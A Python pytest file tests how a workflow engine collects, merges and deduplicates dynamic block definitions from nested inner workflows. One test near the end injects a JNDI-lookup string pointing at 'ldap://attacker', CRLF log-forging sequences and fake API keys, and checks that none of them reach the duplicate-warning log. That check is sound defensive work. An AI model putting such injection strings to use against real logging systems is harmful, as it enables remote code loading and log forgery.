"""Tests for collecting dynamic block definitions from nested inner workflows."""

import logging
from typing import Any, Callable, Dict, List, Optional, Tuple
from unittest import mock

import pytest
from roboflow_workflows.execution_engine.v1.inner_workflow import (
    dynamic_blocks_collection,
)
from roboflow_workflows.execution_engine.v1.inner_workflow.constants import (
    USE_INNER_WORKFLOW_BLOCK_TYPE,
)
from roboflow_workflows.execution_engine.v1.inner_workflow.dynamic_blocks_collection import (
    apply_collected_dynamic_blocks_definitions_to_workflow_root,
    collect_dynamic_blocks_definitions_from_workflow_definition,
)


def _dynamic_block_definition(block_type: str) -> Dict[str, Any]:
    return {
        "type": "DynamicBlockDefinition",
        "manifest": {
            "type": "ManifestDescription",
            "block_type": block_type,
            "inputs": {},
            "outputs": {},
        },
        "code": {
            "type": "PythonCode",
            "run_function_code": "def run(self): return {}",
        },
    }


def test_collect_returns_empty_when_no_dynamic_blocks() -> None:
    workflow = {
        "version": "1.0",
        "inputs": [],
        "steps": [],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == []


def test_collect_from_root_only() -> None:
    parent_block = _dynamic_block_definition("ParentBlock")
    workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": [parent_block],
        "inputs": [],
        "steps": [],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == [parent_block]


def test_collect_from_nested_inner_workflow() -> None:
    child_block = _dynamic_block_definition("ChildBlock")
    child_workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": [child_block],
        "inputs": [],
        "steps": [
            {
                "type": "ChildBlock",
                "name": "use_child",
            },
        ],
        "outputs": [],
    }
    workflow = {
        "version": "1.0",
        "inputs": [],
        "steps": [
            {
                "type": USE_INNER_WORKFLOW_BLOCK_TYPE,
                "name": "nested",
                "workflow_definition": child_workflow,
                "parameter_bindings": {},
            },
        ],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == [child_block]


def test_collect_does_not_load_dynamic_blocks_from_dispatched_workflow() -> None:
    child_block = _dynamic_block_definition("OnlyInstalledOnTarget")
    workflow = {
        "version": "1.0",
        "inputs": [],
        "steps": [
            {
                "type": USE_INNER_WORKFLOW_BLOCK_TYPE,
                "name": "dispatch",
                "execution_mode": "remote_dispatch",
                "workflow_definition": {
                    "version": "1.0",
                    "dynamic_blocks_definitions": [child_block],
                    "inputs": [],
                    "steps": [],
                    "outputs": [],
                },
                "parameter_bindings": {},
            }
        ],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == []


def test_collect_merges_parent_and_child_with_parent_first() -> None:
    parent_block = _dynamic_block_definition("SharedType")
    child_block = _dynamic_block_definition("SharedType")
    child_only = _dynamic_block_definition("ChildOnly")
    child_workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": [child_block, child_only],
        "inputs": [],
        "steps": [],
        "outputs": [],
    }
    workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": [parent_block],
        "inputs": [],
        "steps": [
            {
                "type": USE_INNER_WORKFLOW_BLOCK_TYPE,
                "name": "nested",
                "workflow_definition": child_workflow,
                "parameter_bindings": {},
            },
        ],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == [parent_block, child_only]


def test_apply_hoists_collected_definitions_to_workflow_root() -> None:
    child_block = _dynamic_block_definition("ChildBlock")
    child_workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": [child_block],
        "inputs": [],
        "steps": [],
        "outputs": [],
    }
    workflow = {
        "version": "1.0",
        "inputs": [],
        "steps": [
            {
                "type": USE_INNER_WORKFLOW_BLOCK_TYPE,
                "name": "nested",
                "workflow_definition": child_workflow,
                "parameter_bindings": {},
            },
        ],
        "outputs": [],
    }

    merged = apply_collected_dynamic_blocks_definitions_to_workflow_root(
        workflow_definition=workflow,
    )

    assert merged == [child_block]
    assert workflow["dynamic_blocks_definitions"] == [child_block]


def test_collect_deduplicates_same_block_type_from_repeated_inner_child() -> None:
    child_block = _dynamic_block_definition("ChildBlock")
    child_workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": [child_block],
        "inputs": [],
        "steps": [],
        "outputs": [],
    }
    inner_step = {
        "type": USE_INNER_WORKFLOW_BLOCK_TYPE,
        "name": "nested",
        "workflow_definition": child_workflow,
        "parameter_bindings": {},
    }
    workflow = {
        "version": "1.0",
        "inputs": [],
        "steps": [inner_step, {**inner_step, "name": "nested_copy"}],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == [child_block]


def _workflow(
    dynamic_blocks_definitions: Any = None,
    steps: Optional[List[Any]] = None,
) -> Dict[str, Any]:
    workflow: Dict[str, Any] = {
        "version": "1.0",
        "inputs": [],
        "steps": steps or [],
        "outputs": [],
    }
    if dynamic_blocks_definitions is not None:
        workflow["dynamic_blocks_definitions"] = dynamic_blocks_definitions

    return workflow


def _inner_step(
    workflow_definition: Dict[str, Any],
    name: str = "nested",
    **extra: Any,
) -> Dict[str, Any]:
    return {
        "type": USE_INNER_WORKFLOW_BLOCK_TYPE,
        "name": name,
        "workflow_definition": workflow_definition,
        "parameter_bindings": {},
        **extra,
    }


_UNRELATED_STEP = {"type": "SomeOtherBlock", "name": "unrelated"}

# Each case returns (workflow, expected collected objects, expected warning
# locations as (skipped, retained) pairs).
DuplicateCase = Tuple[Dict[str, Any], List[Any], List[Tuple[str, str]]]


def _root_duplicate_case() -> DuplicateCase:
    first = _dynamic_block_definition("SharedType")
    other = _dynamic_block_definition("OtherType")
    duplicate = _dynamic_block_definition("SharedType")
    workflow = _workflow(dynamic_blocks_definitions=[first, other, duplicate])

    return (
        workflow,
        [first, other],
        [("dynamic_blocks_definitions[2]", "dynamic_blocks_definitions[0]")],
    )


def _nested_duplicate_after_skipped_entries_case() -> DuplicateCase:
    parent = _dynamic_block_definition("SharedType")
    malformed = "not-a-dynamic-block-definition"
    duplicate = _dynamic_block_definition("SharedType")
    missing_type = {"type": "DynamicBlockDefinition", "manifest": {}}
    empty_type = _dynamic_block_definition("")
    child = _workflow(
        dynamic_blocks_definitions=[malformed, duplicate, missing_type, empty_type],
    )
    workflow = _workflow(
        dynamic_blocks_definitions=[parent],
        steps=[_UNRELATED_STEP, "not-a-step", _inner_step(child)],
    )

    return (
        workflow,
        [parent, malformed, missing_type, empty_type],
        [
            (
                "steps[2].workflow_definition.dynamic_blocks_definitions[1]",
                "dynamic_blocks_definitions[0]",
            )
        ],
    )


def _sibling_duplicate_after_remote_dispatch_case() -> DuplicateCase:
    dispatched = _dynamic_block_definition("SharedType")
    first = _dynamic_block_definition("SharedType")
    other = _dynamic_block_definition("OtherType")
    duplicate = _dynamic_block_definition("SharedType")
    workflow = _workflow(
        steps=[
            _inner_step(
                _workflow(dynamic_blocks_definitions=[dispatched]),
                execution_mode="remote_dispatch",
            ),
            _inner_step(_workflow(dynamic_blocks_definitions=[first])),
            _inner_step(_workflow(dynamic_blocks_definitions=[other, duplicate])),
        ],
    )

    return (
        workflow,
        [first, other],
        [
            (
                "steps[2].workflow_definition.dynamic_blocks_definitions[1]",
                "steps[1].workflow_definition.dynamic_blocks_definitions[0]",
            )
        ],
    )


def _deep_repeated_duplicates_case() -> DuplicateCase:
    first = _dynamic_block_definition("SharedType")
    root_duplicate = _dynamic_block_definition("SharedType")
    child_duplicate = _dynamic_block_definition("SharedType")
    grandchild_only = _dynamic_block_definition("GrandchildOnly")
    grandchild_duplicate = _dynamic_block_definition("SharedType")
    grandchild = _workflow(
        dynamic_blocks_definitions=[grandchild_only, grandchild_duplicate],
    )
    child = _workflow(
        dynamic_blocks_definitions=[child_duplicate],
        steps=[_UNRELATED_STEP, _inner_step(grandchild)],
    )
    workflow = _workflow(
        dynamic_blocks_definitions=[first, root_duplicate],
        steps=[_inner_step(child)],
    )

    return (
        workflow,
        [first, grandchild_only],
        [
            ("dynamic_blocks_definitions[1]", "dynamic_blocks_definitions[0]"),
            (
                "steps[0].workflow_definition.dynamic_blocks_definitions[0]",
                "dynamic_blocks_definitions[0]",
            ),
            (
                "steps[0].workflow_definition.steps[1].workflow_definition"
                ".dynamic_blocks_definitions[1]",
                "dynamic_blocks_definitions[0]",
            ),
        ],
    )


def _non_list_duplicate_case() -> DuplicateCase:
    first = _dynamic_block_definition("SharedType")
    non_list_duplicate = _dynamic_block_definition("SharedType")
    workflow = _workflow(
        dynamic_blocks_definitions=[first],
        steps=[_inner_step(_workflow(dynamic_blocks_definitions=non_list_duplicate))],
    )

    return (
        workflow,
        [first],
        [
            (
                "steps[0].workflow_definition.dynamic_blocks_definitions",
                "dynamic_blocks_definitions[0]",
            )
        ],
    )


@pytest.mark.parametrize("warn_on_duplicates", [True, False])
@pytest.mark.parametrize(
    "build_case",
    [
        _root_duplicate_case,
        _nested_duplicate_after_skipped_entries_case,
        _sibling_duplicate_after_remote_dispatch_case,
        _deep_repeated_duplicates_case,
        _non_list_duplicate_case,
    ],
)
def test_collect_logs_structural_locations_of_skipped_and_retained_duplicates(
    build_case: Callable[[], DuplicateCase],
    warn_on_duplicates: bool,
) -> None:
    workflow, expected_collected, expected_locations = build_case()

    with mock.patch.object(dynamic_blocks_collection.logger, "warning") as mock_warning:
        collected = collect_dynamic_blocks_definitions_from_workflow_definition(
            workflow_definition=workflow,
            warn_on_duplicates=warn_on_duplicates,
        )

    assert len(collected) == len(expected_collected)
    assert all(
        actual is expected for actual, expected in zip(collected, expected_collected)
    )
    if not warn_on_duplicates:
        expected_locations = []
    logged_arguments = [call.args[1:] for call in mock_warning.call_args_list]
    assert logged_arguments == expected_locations
    logged_messages = [
        call.args[0] % call.args[1:] for call in mock_warning.call_args_list
    ]
    assert logged_messages == [
        f"Skipping duplicate dynamic block definition at {skipped}; keeping {retained}."
        for skipped, retained in expected_locations
    ]


class _RecordingHandler(logging.Handler):
    def __init__(self) -> None:
        super().__init__()
        self.records: List[logging.LogRecord] = []

    def emit(self, record: logging.LogRecord) -> None:
        self.records.append(record)


def test_duplicate_warning_log_record_contains_no_request_derived_values() -> None:
    secret_block_type = "sk_live_SECRET_TYPE\nFAKE-ENTRY %s ${jndi:ldap://attacker}"
    secret_step_name = "SECRET_STEP_NAME\r\nFAKE-ENTRY"
    secret_code = "API_KEY = 'SECRET_CODE_VALUE'"

    def secret_definition() -> Dict[str, Any]:
        definition = _dynamic_block_definition(secret_block_type)
        definition["code"]["run_function_code"] = secret_code
        return definition

    workflow = _workflow(
        dynamic_blocks_definitions=[secret_definition()],
        steps=[
            {"type": secret_block_type, "name": secret_step_name},
            _inner_step(
                _workflow(dynamic_blocks_definitions=[secret_definition()]),
                name=secret_step_name,
            ),
        ],
    )
    target_logger = dynamic_blocks_collection.logger
    handler = _RecordingHandler()
    previous_level = target_logger.level
    previous_disabled = target_logger.disabled
    target_logger.addHandler(handler)
    target_logger.setLevel(logging.WARNING)
    target_logger.disabled = False
    try:
        collect_dynamic_blocks_definitions_from_workflow_definition(
            workflow_definition=workflow,
        )
    finally:
        target_logger.removeHandler(handler)
        target_logger.setLevel(previous_level)
        target_logger.disabled = previous_disabled

    assert len(handler.records) == 1
    record = handler.records[0]
    rendered = record.getMessage()
    assert rendered == (
        "Skipping duplicate dynamic block definition at "
        "steps[1].workflow_definition.dynamic_blocks_definitions[0]; "
        "keeping dynamic_blocks_definitions[0]."
    )
    assert all(isinstance(argument, str) for argument in record.args)
    raw_parts = [str(record.msg), *(str(argument) for argument in record.args)]
    for forbidden in ("SECRET", "sk_live", "FAKE-ENTRY", "jndi", "API_KEY", "\n", "\r"):
        assert forbidden not in rendered
        assert all(forbidden not in part for part in raw_parts)


def test_collect_passes_through_non_dict_entries_for_downstream_validation() -> None:
    invalid_entry = "not-a-dynamic-block-definition"
    workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": [invalid_entry],
        "inputs": [],
        "steps": [],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == [invalid_entry]


def test_collect_passes_through_non_list_dynamic_blocks_definitions() -> None:
    invalid_definitions = {"type": "DynamicBlockDefinition"}
    workflow = {
        "version": "1.0",
        "dynamic_blocks_definitions": invalid_definitions,
        "inputs": [],
        "steps": [],
        "outputs": [],
    }

    collected = collect_dynamic_blocks_definitions_from_workflow_definition(
        workflow_definition=workflow,
    )

    assert collected == [invalid_definitions]
